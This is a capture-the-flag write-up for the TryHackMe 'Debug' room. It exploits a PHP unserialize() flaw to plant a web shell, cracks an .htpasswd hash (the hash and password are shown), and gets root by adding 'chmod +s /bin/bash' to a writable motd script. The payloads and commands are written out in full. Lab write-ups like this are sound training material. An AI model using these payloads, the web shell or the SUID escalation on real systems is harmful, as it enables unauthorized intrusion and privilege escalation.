# 85 - Debug (PHP Serialization RCE)

Room Link --> [https://tryhackme.com/room/debug](https://tryhackme.com/room/debug)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap 10.10.110.29 -Pn -n -vvv

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
{% endcode %}

#### FFUF Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u http://10.10.110.29/FUZZ -c -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 500 --ic

backup
grid
javascript
less
javascripts
/index.html
/index.php
/message.txt
```
{% endcode %}



We got an `index.php.bak and index.html.bak` file in the backup dir.

{% code title="index.php.bak" overflow="wrap" lineNumbers="true" %}
```php
<?php
class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {
$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';
}
}
// Leaving this for now... only for debug purposes... do not touch!
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();
?>
```
{% endcode %}

**IN THIS SNIPPET,**

**THE USER INPUT GET UNSERIALIZED WE CAN USE THE PHP DESERIALIZATION EXPLOIT.**

**THEORY:**

[**Serialization**](https://notsosecure.com/remote-code-execution-via-php-unserialize/) is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.

Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow.

In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:

1. The application must have a class which implements a PHP magic method (such as \_\_wakeup or \_\_destruct) that can be used to carry out malicious attacks, or to start a “POP chain”.
2. All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.

### PHP Deserialization Exploit

Here we are going to focus on the `debug` parameter.

{% code overflow="wrap" lineNumbers="true" %}
```php
<?php
class FormSubmit
{
   public $form_file = 'shell.php';
   public $message = '<?php system($_GET["cmd"]); ?>';
}
print serialize(new FormSubmit);
?>

# php shell.php > shell.txt # serialized data is stored in shell.txt
O:10:"FormSubmit":2:{s:9:"form_file";s:9:"shell.php";s:7:"message";s:30:"<?php system($_GET["cmd"]); ?>";}

# copy and urlencode the result using burp.
```
{% endcode %}

Send this as the value of the `debug` parameter using burpsuite, Setup NC listener to catch the shell.

<figure><img src=".gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

When we navigate to [http://10.10.110.29/shell.php?cmd=id](http://10.10.110.29/shell.php?cmd=id) we get RCE.

<figure><img src=".gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

From here its easy to get RevShell.

### Priv Esc

After gaining access, the same dir, there is a `.htpasswd` file there.

```bash
www-data@osboxes:/var/www/html$ ls -al
ls -al
total 72
drwxr-xr-x 6 www-data www-data  4096 Nov 21 02:32 .
drwxr-xr-x 3 root     root      4096 Mar  9  2021 ..
-rw-r--r-- 1 www-data www-data    44 Mar  9  2021 .htpasswd
drwxr-xr-x 5 www-data www-data  4096 Mar  9  2021 backup
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 grid
-rw-r--r-- 1 www-data www-data 11321 Mar  9  2021 index.html
-rw-r--r-- 1 www-data www-data  6399 Mar  9  2021 index.php
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 javascripts
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 less
-rw-r--r-- 1 www-data www-data   470 Nov 21 02:36 message.txt
-rw-r--r-- 1 www-data www-data  2339 Mar  9  2021 readme.md
-rw-r--r-- 1 www-data www-data    30 Nov 21 02:36 shell.php
-rw-r--r-- 1 www-data www-data 10371 Mar  9  2021 style.css
www-data@osboxes:/var/www/html$ cat .htpasswd
cat .htpasswd
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
www-data@osboxes:/var/www/html$ 
```

We can crack with john

```
jamaica          (james)
```

We can ssh into james acct.

### Priv Esc to root

There is a note for James from root.

{% code overflow="wrap" lineNumbers="true" %}
```bash
james@osboxes:~$ cat Note-To-James.txt 
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
james@osboxes:~$ 

```
{% endcode %}

so James can modify the welcome message in ssh that located in `/etc/update-motd.d/00-header`

```bash
james@osboxes:/etc/update-motd.d$ ls -al
total 44
drwxr-xr-x   2 root root   4096 Mar 10  2021 .
drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
-rwxrwxr-x   1 root james  1220 Mar 10  2021 00-header
-rwxrwxr-x   1 root james     0 Mar 10  2021 00-header.save
-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
-rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
```

SO I EDIT THE '00-header' FILE AND WRITE:

`chmod +s /bin/bash` .

Then login ssh again from another terminal.

And am ROOT

```bash
Last login: Tue Nov 21 02:43:29 2023 from 10.18.88.214
-bash-4.3$ id
uid=1001(james) gid=1001(james) groups=1001(james)
-bash-4.3$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
-bash-4.3$ bash -p
bash-4.3# id
uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james)
bash-4.3# 
```

Done!

